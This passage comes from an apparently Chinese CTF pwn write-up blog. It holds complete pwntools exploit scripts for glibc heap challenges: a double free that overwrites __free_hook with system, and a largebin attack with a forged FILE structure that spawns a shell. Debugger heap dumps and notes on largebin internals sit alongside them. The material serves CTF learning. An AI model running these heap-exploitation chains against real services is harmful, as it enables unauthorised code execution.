class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>   io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>   io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>   io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>   io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>   io.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>):<br>   add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">10</span>):<br>   delete(i)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 合并chunk0 1 2</span><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x170</span>))<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># overlapping</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)   <span class="hljs-comment"># 相当于add(0xf8) 只是分了两次 并产生了分割</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br><br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># 前2个是unsortedbin中的 剩下0x21进入smallbin 然后从topchunk中分配 不是从tcache中</span><br>   add(i, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>   delete(i)<br><br>delete(<span class="hljs-number">3</span>) <span class="hljs-comment"># 进入fastbin</span><br>delete(<span class="hljs-number">12</span>) <span class="hljs-comment"># 进入fastbin</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 是id=3的chunk double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>   add(i, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, p64(free_hook))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>, p64(system))<br><br>delete(<span class="hljs-number">3</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5603132f7000<br>Size: 0x251<br><br>Free chunk (unsortedbin) | PREV_INUSE<br>Addr: 0x5603132f7250<br>Size: 0x271<br>fd: 0x7f69f8529ca0<br>bk: 0x7f69f8529ca0<br><br>-------------------------------------------------------<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c9000<br>Size: 0x251<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c9250<br>Size: 0x81<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c92d0<br>Size: 0x81<br><br>Free chunk (unsortedbin) | PREV_INUSE<br>Addr: 0x5587433c9350<br>Size: 0x171<br>fd: 0x7fbf2c9e7ca0<br>bk: 0x7fbf2c9e7ca0<br><br>--------------------------------------------------------<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x559a66a40250</span><br>0x559a66a40250:0x00000000000000000x0000000000000081 #原chunk0_0xf8 现chunk0_0x78<br>0x559a66a40260:0x00007f0266000a610x00007f02665f4f00<br>0x559a66a40270:0x00000000000000000x0000000000000000<br>0x559a66a40280:0x00000000000000000x0000000000000000<br>0x559a66a40290:0x00000000000000000x0000000000000000<br>0x559a66a402a0:0x00000000000000000x0000000000000000<br>0x559a66a402b0:0x00000000000000000x0000000000000000<br>0x559a66a402c0:0x00000000000000000x0000000000000000<br>0x559a66a402d0:0x00000000000000000x0000000000000081 # 现chunk2_0x78<br>0x559a66a402e0:0x00007f0266000a610x00007f02665f4ca0<br>0x559a66a402f0:0x00000000000000000x0000000000000000<br>0x559a66a40300:0x00000000000000000x0000000000000000<br>0x559a66a40310:0x00000000000000000x0000000000000000<br>0x559a66a40320:0x00000000000000000x0000000000000000<br>0x559a66a40330:0x00000000000000000x0000000000000000<br>0x559a66a40340:0x00000000000000000x0000000000000000<br>0x559a66a40350:0x00000000000001000x0000000000000071 # 原chunk1_0x68 现chunk3<br>0x559a66a40360:0x00007f0266000a610x00007f02665f4ca0<br>0x559a66a40370:0x61616161616161610x6161616161616161<br>0x559a66a40380:0x61616161616161610x6161616161616161<br>0x559a66a40390:0x61616161616161610x6161616161616161<br>0x559a66a403a0:0x61616161616161610x6161616161616161<br>0x559a66a403b0:0x61616161616161610x6161616161616161<br>0x559a66a403c0:0x00000000000001700x0000000000000071<br>0x559a66a403d0:0x00000000000000000x0000559a66a40010<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Elden-Ring-Ⅲ"><a href="#Elden-Ring-Ⅲ" class="headerlink" title="Elden Ring Ⅲ"></a>Elden Ring Ⅲ</h3><ul><li><p>largebin uaf 还是用不了给的附件 全绿</p></li><li><p>啊我懂了 可以用<code>--replace-needed</code> 第一个参数写默认给的libc路径(可以用ldd查到)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">(pwn) ╭─yech0@pwn ~ <br>╰─$ ldd ./vuln<br>linux-vdso.so.1 (0x00007fff955d0000)<br>./2.32-0ubuntu3.2_amd64/libc.so.6 =&gt; not found<br>(pwn) ╭─yech0@pwn ~ <br>╰─$ patchelf --set-interpreter /home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so --replace-needed ./2.32-0ubuntu3.2_amd64/libc.so.6 /home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6 vuln<br>(pwn) ╭─yech0@pwn ~ <br>╰─$ ldd ./vuln<br>linux-vdso.so.1 (0x00007fffa2df2000)<br>/home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6 (0x00007f2d6f214000)<br>/home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f2d6f409000)<br></code></pre></td></tr></table></figure></li><li><p>largebin相关的基础</p><blockquote><p><strong>Large Bin</strong></p><ul><li>large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致<br> <strong>Large chunk的微观结构</strong></li></ul><p>大于512（1024）字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的</p><p>被释放进Large Bin中的chunk，除了以前经常见到的prev_size、size、fd、bk之外，还具有fd_nextsize和bk_nextsize:</p><p>   fd_nextsize，bk_nextsize：只有chunk可先的时候才使用，不过用于较大的chunk（large chunk）<br>   fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>   bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>   一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历</p><p><strong>Large Bin的插入顺序</strong></p><p>在index相同的情况下：</p><p>1、按照大小，从大到小排序（小的链接large bin）<br>2、如果大小相同，按照free的时间排序<br>3、多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0<br>4、size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/qq_41202237/article/details/112825556">https://blog.csdn.net/qq_41202237/article/details/112825556</a></p><p>FIFO：将先进入的chunk设置为链头，后面插入chunk在链头的后面，取出时取出链头的下一个chunk。</p><p>从largebin中取的时候从小的开始(不同size范围的链表中小的   同一链表中小的chunk)</p><p><a href="https://pic3.zhimg.com/v2-013b4b50d1e03e09f6dab79bcfb97e52_r.jpg">https://pic3.zhimg.com/v2-013b4b50d1e03e09f6dab79bcfb97e52_r.jpg</a></p><p>也就是说 从largebin中size最小的链表的第二个chunk取 剩下的部分进入unsortedbin(unsortedbin也是FIFO 双向链表都是)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;add(<span class="hljs-number">0</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin</span><br>&gt;add(<span class="hljs-number">1</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">2</span>, <span class="hljs-number">0x800</span>) <span class="hljs-string">&#x27;&#x27;&#x27;0x800-0x830 largebin&#x27;&#x27;&#x27;</span><br>&gt;add(<span class="hljs-number">3</span>, <span class="hljs-number">0x600</span>) <br>&gt;add(<span class="hljs-number">4</span>, <span class="hljs-number">0x800</span>) <span class="hljs-string">&#x27;&#x27;&#x27;0x800-0x830 largebin&#x27;&#x27;&#x27;</span><br>&gt;add(<span class="hljs-number">5</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">6</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">7</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">8</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">9</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">10</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">11</span>, <span class="hljs-number">0x600</span>)<br>&gt;delete(<span class="hljs-number">0</span>)<br>&gt;delete(<span class="hljs-number">2</span>)<br>&gt;delete(<span class="hljs-number">4</span>)<br>&gt;delete(<span class="hljs-number">6</span>)<br>&gt;delete(<span class="hljs-number">8</span>)<br>&gt;delete(<span class="hljs-number">10</span>)<br><br>&gt;add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>) <span class="hljs-comment"># chunk6</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>house of apple   <a href="https://blog.csdn.net/qq_61670993/article/details/136233121">https://blog.csdn.net/qq_61670993/article/details/136233121</a></p><blockquote><p><a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">amd64：</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x0:<span class="hljs-string">&#x27;_flags&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x8:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x10:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x18:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x20:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x28:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x30:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x38:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x40:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x48:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x50:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x58:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x60:<span class="hljs-string">&#x27;_markers&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x68:<span class="hljs-string">&#x27;_chain&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x70:<span class="hljs-string">&#x27;_fileno&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x74:<span class="hljs-string">&#x27;_flags2&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x78:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x80:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x82:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x83:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x88:<span class="hljs-string">&#x27;_lock&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x90:<span class="hljs-string">&#x27;_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x98:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xa0:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xa8:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xb0:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xb8:<span class="hljs-string">&#x27;__pad5&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xc0:<span class="hljs-string">&#x27;_mode&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xc4:<span class="hljs-string">&#x27;_unused2&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xd8:<span class="hljs-string">&#x27;vtable&#x27;</span></span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">indx, content</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x530</span>)<br><br>show(<span class="hljs-number">2</span>)<br>largebin = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = largebin - (<span class="hljs-number">0xb030</span>-<span class="hljs-number">0xab90</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;lgbin=&#x27;</span>+<span class="hljs-built_in">hex</span>(largebin))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<span class="hljs-comment"># 修改了chunk2的fd&amp;bk 导致从largebin中脱离 此时chunk2变成了malloc状态</span><br>io.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>chunk2 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chunk2=&quot;</span>+<span class="hljs-built_in">hex</span>(chunk2))<br><br><span class="hljs-comment"># edit(2, p64(largebin)*2) # 后面也改了 这不写也能通</span><br><br>_IO_all_list = libc_base + <span class="hljs-number">0x1e45c0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;_IO_all_list&#x27;</span>+<span class="hljs-built_in">hex</span>(_IO_all_list))<br><br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># largebin attack  add(5)后将chunk0插入largebin中 导致IO_all_list位置被修改成chunk0的地址</span><br>payload = p64(largebin)*<span class="hljs-number">2</span> <br>payload += p64(chunk2) + p64(_IO_all_list-<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">2</span>, payload)<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x550</span>)<br><br>chunk0 = chunk2 - <span class="hljs-number">0xa30</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;chunk0=&#x27;</span>+<span class="hljs-built_in">hex</span>(chunk0))<br><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x500</span>) + p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&#x27;;sh\x00&#x27;</span>)<span class="hljs-comment"># flag字段设置为0x68733bfffff7f5</span><br>fake_io_file = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># _IO_write_base=1，_IO_write_ptr=2  （好像只要前&lt;后就能打通</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(chunk0+<span class="hljs-number">0x100</span>) <span class="hljs-comment"># _wide_data</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xc0</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># _mode=-1</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xd8</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base+<span class="hljs-number">0x1e4f80</span>) <span class="hljs-comment"># vtable改为_IO_wfile_jumps</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0x100</span>-<span class="hljs-number">0x10</span> + <span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(chunk0+<span class="hljs-number">0x200</span>) <span class="hljs-comment"># _wide_data-&gt;_wide_vtable改为可控地址</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span> + p64(system) <span class="hljs-comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate改为system</span><br>edit(<span class="hljs-number">0</span>, fake_io_file)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 